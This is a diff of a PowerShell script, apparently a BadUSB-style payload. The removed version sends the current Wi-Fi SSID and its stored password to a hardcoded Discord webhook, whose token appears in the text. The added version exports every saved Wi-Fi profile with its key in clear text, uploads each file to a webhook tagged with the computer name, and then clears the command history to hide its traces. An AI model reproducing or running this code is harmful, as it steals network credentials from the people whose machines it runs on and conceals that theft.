@@ -1,23 +1,79 @@
-# send-wifi-to-discord.ps1
-$webhook = 'https://discord.com/api/webhooks/1435247462758617129/Ar2MZy15aqzxhgd5PayvEnZsB4gvrR2HRWUpvBELXZyChiD6w0CZkTnaQ1SaX4JysM48'
+# Export-Verzeichnis
+$exportDir = "$env:temp\SomeStuff"
 
-# Get connected SSID
-$ssid = (netsh wlan show interfaces |
-         Select-String '^\s*SSID\s*:\s*(.+)$' |
-         ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() })
-if (-not $ssid) { Write-Host "No SSID"; exit }
+# Sicherstellen, dass das Exportverzeichnis existiert
+if (-not (Test-Path $exportDir)) {
+    try {
+        New-Item -ItemType Directory -Path $exportDir -Force
+    } catch {
+        Write-Host "Fehler beim Erstellen des Exportverzeichnisses: $_"
+        return
+    }
+}
 
-# Escape single quotes in SSID for safe netsh usage
-$ssidEscaped = $ssid -replace "'", "''"
+# WLAN-Profile exportieren (inkl. Schlüssel)
+try {
+    netsh wlan export profile key=clear folder=$exportDir
+} catch {
+    Write-Host "Fehler beim Exportieren der WLAN-Profile: $_"
+    return
+}
 
-# Get stored Wi-Fi password (may require admin)
-$pw = (netsh wlan show profile name='$ssidEscaped' key=clear |
-       Select-String 'Key Content\s*:\s*(.+)$' |
-       ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() })
+# Alle exportierten XML-Dateien lesen
+$xmlFiles = Get-ChildItem -Path $exportDir -Filter "*.xml"
+if ($xmlFiles.Count -eq 0) {
+    Write-Host "Keine exportierten WLAN-Profile gefunden."
+    return
+}
 
-if (-not $pw) { $pw = "<not-found-or-needs-admin>" }
+# Webhook-Anfrage mit Datei-Upload
+foreach ($xmlFile in $xmlFiles) {
+    $fileContent = Get-Content -Path $xmlFile.FullName -Raw
 
-# Build and send payload
-$content = "SSID: $ssid`nPASS: $pw"
-$payload = @{ content = $content; username = 'NetInfoBot' } | ConvertTo-Json
-Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'application/json'
+    # Bereite die Daten vor
+    $formData = @{
+        "username" = "$env:COMPUTERNAME"
+        "content"  = "Hier ist das WLAN-Profil: $($xmlFile.Name)"
+    }
+
+    $formDataFiles = @{
+        "file" = New-Object System.IO.FileInfo($xmlFile.FullName)
+    }
+
+    # Setze Header für multipart/form-data
+    $boundary = [System.Guid]::NewGuid().ToString()
+    $contentType = "multipart/form-data; boundary=$boundary"
+    $body = ""
+
+    # Füge die Daten hinzu
+    foreach ($key in $formData.Keys) {
+        $body += "--$boundary`r`n"
+        $body += "Content-Disposition: form-data; name=`"$key`"`r`n"
+        $body += "`r`n"
+        $body += "$($formData[$key])`r`n"
+    }
+
+    # Füge die Datei hinzu
+    $body += "--$boundary`r`n"
+    $body += "Content-Disposition: form-data; name=`"file`"; filename=`"$($formDataFiles['file'].Name)`"`r`n"
+    $body += "Content-Type: application/octet-stream`r`n"
+    $body += "`r`n"
+    $body += [System.IO.File]::ReadAllText($formDataFiles['file'].FullName)
+    $body += "`r`n"
+    $body += "--$boundary--`r`n"
+
+    # Wandeln Sie den Body in Byte-Daten um
+    $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body)
+
+    # Senden Sie die Anfrage
+    try {
+        $response = Invoke-RestMethod -Uri $whuri -Method Post -Body $bodyBytes -Headers @{
+            "Content-Type" = $contentType
+        }
+        Write-Host "Erfolgreich an den Webhook gesendet: $($xmlFile.Name)"
+    } catch {
+        Write-Host "Fehler beim Senden an den Webhook: $_"
+    }
+}
+
+Clear-History
